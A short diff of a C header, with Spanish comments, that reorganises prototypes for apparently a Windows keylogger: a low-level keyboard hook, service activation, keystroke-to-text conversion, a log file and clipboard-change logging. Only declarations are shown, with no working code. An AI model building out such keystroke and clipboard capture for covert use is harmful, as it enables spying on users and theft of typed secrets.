@@ -52,23 +52,24 @@
 
 
 	// main.c
-	BOOL IsAdmin(void);
+    BOOL IsAdmin(void);
 
-	// hook.c
-	BOOL ActivateHook(void);
-	void DeactivateHook(void);
+    // service.c - Gestión del servicio y activación/desactivación
+    BOOL ActivateHook(void);
+    void DeactivateHook(void);
 
-	//log.c
-	BOOL OpenLogFile(void);
+    // hook.c - Callback del hook para service.c
+    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
-	// key.c
-	const char *VkCodeToString(DWORD vk);
-	
-	// clipboard.c
-	BOOL OpenClipboardLog(void);
-	void CloseClipboardLog(void);
-	void LogClipboardIfChanged(void);
-	
-	
+    // log.c - Gestión del archivo de log principal
+    BOOL OpenLogFile(void);
+
+    // key.c - Conversión de teclas a texto legible
+    const char *VkCodeToString(DWORD vkCode);
+    
+    // clipboard.c - Gestión del log del portapapeles
+    BOOL OpenClipboardLog(void);
+    void CloseClipboardLog(void);
+    void LogClipboardIfChanged(void);
 
 #pragma endregion
